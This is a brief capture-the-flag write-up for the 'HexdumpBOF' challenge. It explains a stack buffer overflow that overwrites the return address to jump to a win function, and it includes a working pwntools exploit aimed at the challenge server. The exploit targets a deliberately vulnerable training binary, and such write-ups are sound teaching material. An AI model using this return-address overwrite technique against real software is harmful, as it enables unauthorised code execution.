# HexdumpBOF

This is a buffer overflow challenge, with a few helpers
to help you verify your work. The idea is that we can force
the `rip` to be whatever we want, by overwriting the value
on the stack. In this case, we can force it to be `&win`.

The 16-byte padding thing is just something to watch out for, sigh

Exploit code:

```python
from pwn import *

io = remote("challs1.nusgreyhats.org", 5002)

padding = b"A"*32
pad = b"A"*8
ret = b"\xdc\x14\x40\x00\x00\x00\x00\x00"

io.send(padding + pad + ret + b"\n")

io.interactive()
```